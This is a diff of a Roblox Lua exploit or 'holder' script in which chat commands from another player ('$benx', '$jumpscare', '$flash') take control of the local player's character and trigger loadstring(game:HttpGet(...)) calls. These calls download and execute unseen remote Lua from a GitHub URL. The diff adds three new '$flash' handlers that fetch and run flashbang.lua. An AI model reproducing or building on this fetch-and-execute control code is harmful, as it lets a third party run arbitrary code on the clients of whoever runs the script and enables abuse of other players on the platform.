@@ -92,21 +92,21 @@ function premium()
 		
 		end)
 		
-			v.Chatted:connect(function(cht)
+		v.Chatted:connect(function(cht)
 			if cht:match("$benx .") then
 			if game.Players.LocalPlayer ~= v then
 			BeingBenxed = true
 			while BeingBenxed == true do
-				game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = v.Character.HumanoidRootPart.CFrame + v.Character.HumanoidRootPart.CFrame.lookVector * 0.5
-				game.Players.LocalPlayer.Character.HumanoidRootPart.Velocity = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame.lookVector * 70
-				wait(0.1)
-				game.Players.LocalPlayer.Character.HumanoidRootPart.Velocity = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame.lookVector * -200
-				for i,v in pairs(game:GetService('Players'):GetChildren()) do
-                AnimationId = "3152394906"
-                local Anim = Instance.new("Animation")
-                Anim.AnimationId = "rbxassetid://"..AnimationId
-                local BenxAnimation = game.Players.LocalPlayer.Character.Humanoid:LoadAnimation(Anim)
-                BenxAnimation:Play()
+			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = v.Character.HumanoidRootPart.CFrame + v.Character.HumanoidRootPart.CFrame.lookVector * 0.5
+			game.Players.LocalPlayer.Character.HumanoidRootPart.Velocity = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame.lookVector * 70
+			wait(0.1)
+			game.Players.LocalPlayer.Character.HumanoidRootPart.Velocity = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame.lookVector * -200
+			for i,v in pairs(game:GetService('Players'):GetChildren()) do
+            AnimationId = "3152394906"
+            local Anim = Instance.new("Animation")
+            Anim.AnimationId = "rbxassetid://"..AnimationId
+            local BenxAnimation = game.Players.LocalPlayer.Character.Humanoid:LoadAnimation(Anim)
+            BenxAnimation:Play()
                 end
 			end
 		end
@@ -238,6 +238,14 @@ end)
 			if cht:match("$jumpscare .") then
 				if game.Players.LocalPlayer ~= v then
 				    loadstring(game:HttpGet("https://raw.githubusercontent.com/eksotopro/holders/main/jumpscare.lua"))()
+				end
+			end
+		end)
+		
+		v.Chatted:connect(function(cht)
+			if cht:match("$flash .") then
+				if game.Players.LocalPlayer ~= v then
+				    loadstring(game:HttpGet("https://raw.githubusercontent.com/eksotopro/holders/main/flashbang.lua"))()
 				end
 			end
 		end)
@@ -519,7 +527,14 @@ end)
 				    loadstring(game:HttpGet("https://raw.githubusercontent.com/eksotopro/holders/main/jumpscare.lua"))()
 				end
 			end
+		end)
 		
+		v.Chatted:connect(function(cht)
+			if cht:match("$flash .") then
+				if game.Players.LocalPlayer ~= v then
+				    loadstring(game:HttpGet("https://raw.githubusercontent.com/eksotopro/holders/main/flashbang.lua"))()
+				end
+			end
 		end)
 		v.Chatted:connect(function(cht)
 			if cht:match("$refresh .") then
@@ -790,6 +805,15 @@ v.Chatted:connect(function(cht)
 		end
 	end
 end)
+
+		v.Chatted:connect(function(cht)
+			if cht:match("$flash .") then
+				if game.Players.LocalPlayer ~= v then
+				    loadstring(game:HttpGet("https://raw.githubusercontent.com/eksotopro/holders/main/flashbang.lua"))()
+				end
+			end
+		end)
+
 v.Chatted:connect(function(cht)
 	if cht:match("$refresh .") then
 			if game.Players.LocalPlayer ~= v then
